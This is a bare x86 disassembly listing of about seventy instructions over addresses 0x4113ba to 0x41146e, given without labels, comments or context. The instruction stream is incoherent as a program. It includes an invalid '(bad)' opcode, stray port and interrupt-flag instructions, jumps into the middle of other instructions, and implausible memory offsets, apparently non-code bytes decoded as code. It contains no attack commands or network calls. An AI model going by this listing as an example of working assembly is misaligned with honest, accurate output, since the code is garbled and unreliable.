  4113ba:	mov    edx,DWORD PTR [eax+0x14]
  4113bd:	das    
  4113be:	add    al,0x45
  4113c0:	add    BYTE PTR [ebp+0x0],dh
  4113c3:	mov    edi,edi
  4113c5:	and    al,0x50
  4113c7:	mov    eax,DWORD PTR [eax]
  4113c9:	and    al,0xd1
  4113cb:	xor    eax,DWORD PTR [esi]
  4113cd:	lea    eax,[ebp+0x8]
  4113d0:	xor    esi,DWORD PTR [edx+0x3]
  4113d3:	add    BYTE PTR [ecx+0x4510fc44],cl
  4113d9:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  4113df:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  4113e9:	cmp    al,0xff
  4113eb:	pushf  
  4113ec:	mov    edi,edi
  4113ee:	or     BYTE PTR [esi+ecx*1],cl
  4113f1:	jne    0x4113b6
  4113f3:	call   0xa13bf
  4113f8:	adc    BYTE PTR [ebp+eax*2+0xc],al
  4113fc:	mov    ebx,DWORD PTR [eax]
  4113fe:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  411402:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  41140a:	pop    esi
  41140b:	dec    ecx
  41140d:	and    al,0x10
  41140f:	call   DWORD PTR [ebp+0x24]
  411412:	in     al,dx
  411413:	call   0xffc512fc
  411418:	adc    BYTE PTR [ecx+esi*1+0xc],al
  41141c:	pushf  
  41141d:	pop    esi
  41141e:	mov    ebp,esp
  411420:	and    al,0xc2
  411422:	push   edi
  411423:	add    BYTE PTR [ecx+0x33],al
  411426:	mov    DWORD PTR [ebp+0x24],esi
  411429:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  41142f:	dec    DWORD PTR [eax]
  411431:	and    al,0x7
  411433:	(bad)  
  411434:	cli    
  411435:	and    al,0x9b
  411437:	or     BYTE PTR [edx],dh
  411439:	sbb    BYTE PTR [ebx],al
  41143b:	adc    al,0x89
  41143d:	jmp    DWORD PTR [esp]
  411440:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  411446:	adc    al,0x8
  411448:	dec    ebp
  411449:	adc    BYTE PTR [ebp-0x7c],dh
  41144c:	mov    esi,DWORD PTR [edx]
  41144e:	and    al,0x24
  411450:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  411456:	add    edi,eax
  411458:	pcmpeqb mm1,mm2
  41145b:	jmp    0x4114a9
  41145d:	dec    DWORD PTR [eax]
  41145f:	je     0x41144c
  411461:	mov    edi,DWORD PTR [ecx]
  411463:	pop    ebp
  411464:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  411468:	fwait
  411469:	mov    DWORD PTR [eax-0x8],ebp
  41146c:	jge    0x4114d6
  41146e:	dec    DWORD PTR [ecx+0x5fbf7424]
